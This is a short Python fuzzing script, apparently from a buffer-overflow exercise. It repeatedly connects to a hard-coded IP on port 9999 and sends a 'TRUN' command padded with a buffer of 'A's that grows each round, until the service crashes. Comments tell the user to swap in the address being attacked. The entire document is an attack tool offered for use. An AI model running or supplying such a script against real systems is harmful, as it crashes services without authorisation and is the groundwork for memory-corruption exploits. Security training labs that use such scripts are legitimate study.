#!/usr/bin/python3

import sys, socket
from time import sleep

buffer = "A" * 100

while True:
    try:
        payload = "TRUN /.:/" + buffer #replace TRUN with the process

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('172.16.98.40',9999)) #change this to the ip you attacking
        print("[*] Sending the payload[#]...\n" + str(len(buffer)))
        s.send((payload.encode()))
        s.close()
        sleep(1)
        buffer = buffer + "A"*100
    except:
        print ("The fuzzing crashed at %s bytes" % str(len(buffer)))
        sys.exit()
